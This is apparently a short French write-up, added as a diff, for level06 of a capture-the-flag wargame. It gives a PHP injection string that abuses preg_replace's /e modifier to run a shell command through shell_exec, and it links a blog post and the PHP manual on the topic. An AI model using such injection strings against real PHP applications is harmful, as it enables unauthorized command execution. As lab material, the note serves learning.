@@ -1,0 +1,5 @@
+il suffit d'ecrire [x {${shell_exec(getflag)}}] dans un fichier et de l'executer avec le programme level06
+
+https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
+
+https://www.php.net/manual/fr/reference.pcre.pattern.modifiers.php
